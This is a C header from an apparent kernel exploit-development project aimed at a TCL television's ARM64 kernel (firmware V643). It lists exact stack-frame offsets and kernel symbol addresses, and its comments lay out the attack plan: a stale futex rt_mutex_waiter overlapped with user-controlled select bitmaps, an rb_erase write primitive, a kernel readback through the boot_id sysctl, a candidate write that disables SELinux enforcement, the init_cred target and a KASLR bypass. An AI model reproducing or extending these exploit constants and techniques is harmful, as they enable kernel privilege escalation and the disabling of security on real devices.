#ifndef TCL_V643_COMPAT_SELECT_GEOMETRY_H
#define TCL_V643_COMPAT_SELECT_GEOMETRY_H

/* Exact stock V643 ARM32-compat select geometry recovered from:
 *
 *   __arm64_compat_sys_select  frame 0x10
 *   do_compat_select           frame 0x80
 *   compat_core_sys_select     frame 0x1b0, local bitmap at sp+0x40
 *
 * Relative to SP at entry to the syscall wrapper, the six local fd bitmaps
 * therefore begin at -0x200.  The exact futex and futex_time32 wrappers both
 * use a 0xa0 frame and call the same do_futex implementation; its stale
 * rt_mutex_waiter begins at syscall_sp-0x1d0.  The waiter consequently starts
 * 0x30 bytes into the compat-select bitmap block.
 *
 * nfds=320 produces 40 bytes per bitmap.  The first three bitmaps are copied
 * from userspace (120 bytes total); the following three output bitmaps are
 * zeroed by compat_core_sys_select.  User input controls the waiter through
 * wake_state/prio, while deadline and ww_ctx land in the zeroed output area.
 *
 * These constants describe an offline candidate only.  They do not prove the
 * vulnerable transition, PI walk or write primitive on the television.
 */

#define TCL_V643_COMPAT_SELECT_NFDS              320U
#define TCL_V643_COMPAT_SELECT_SET_BYTES          40U
#define TCL_V643_COMPAT_SELECT_INPUT_BYTES       120U
#define TCL_V643_COMPAT_SELECT_ALL_BYTES         240U

#define TCL_V643_COMPAT_SELECT_WRAPPER_FRAME    0x10
#define TCL_V643_DO_COMPAT_SELECT_FRAME         0x80
#define TCL_V643_COMPAT_CORE_SELECT_FRAME      0x1b0
#define TCL_V643_COMPAT_CORE_BITMAP_OFF         0x40

#define TCL_V643_COMPAT_SELECT_BITMAP_REL      (-0x200)
#define TCL_V643_COMPAT_FUTEX_WAITER_REL       (-0x1d0)
#define TCL_V643_COMPAT_WAITER_IN_BITMAPS        0x30

/* Direct-stack candidate anchors from the exact V643 ELF/System.map.
 *
 * panic.buf is the 1024-byte message buffer passed to vsnprintf() only after
 * panic() has been entered.  The Amazon GhostLock port explicitly uses that
 * same kind of "panic msg buf" as its fake-lock scratch.  On V643 the symbol
 * interval is [0x028eba38, 0x028ebe38), exactly 32 slots of 0x20 bytes.  The
 * address is naturally 8-byte aligned, which is sufficient for every
 * rt_mutex_base pointer/word accessed by the candidate.
 *
 * The boot_id ctl_table entry was identified in the exact ELF by its
 * "boot_id" procname, proc_do_uuid.cfi_jt handler and data pointer.  The
 * address below is the ctl_table.data FIELD, not the UUID buffer it points
 * at.  rb_erase can replace that pointer transiently; proc_do_uuid then gives
 * a userspace readback channel.  This is destructive: the same rb_erase case
 * also stores the data-field address at parent_color+8.
 */
#define TCL_V643_PANIC_BUF_OFF                 0x028eba38ULL
#define TCL_V643_PANIC_BUF_SIZE                     0x400U
#define TCL_V643_DIRECT_LOCK_SLOT_STRIDE              0x20U
#define TCL_V643_DIRECT_LOCK_SLOT_COUNT                 32U

#define TCL_V643_BOOT_ID_CTL_DATA_FIELD_OFF    0x027f6500ULL
#define TCL_V643_SYSCTL_BOOTID_OFF             0x0295bce1ULL
#define TCL_V643_INIT_CRED_OFF                 0x027c4a88ULL
#define TCL_V643_SELINUX_STATE_OFF             0x02940460ULL

/* Candidate value for an 8-byte rb_erase write to selinux_state.  The first
 * two little-endian bytes are zero (enforcing/checkreqprot), while byte two
 * is non-zero (initialized).  Its unavoidable +8 collateral write remains
 * inside the tail of non_irq_wake_reason, not an allocator or lock object.
 * This is still corruption of live state and therefore remains model-only. */
#define TCL_V643_NON_IRQ_WAKE_REASON_OFF        0x028eff28ULL
#define TCL_V643_NON_IRQ_WAKE_REASON_SIZE             0x100U
#define TCL_V643_SELINUX_STAMP_PARENT_OFF       0x028f0000ULL

/* Exact image and entry-text geometry.  kaslr_early_init masks the image
 * component with 0x1fffe00000, so the runtime image slide is 2 MiB aligned.
 * Repeated syscall entry samples therefore recover runtime _text by masking
 * an IP known to lie in this first image block. */
#define TCL_V643_KIMAGE_TEXT_BASE       0xffffffc008000000ULL
#define TCL_V643_KASLR_IMAGE_ALIGNMENT          0x200000ULL
#define TCL_V643_ENTRY_TEXT_START_OFF              0x1032cULL
#define TCL_V643_ENTRY_TEXT_END_OFF                0x12c24ULL

#endif
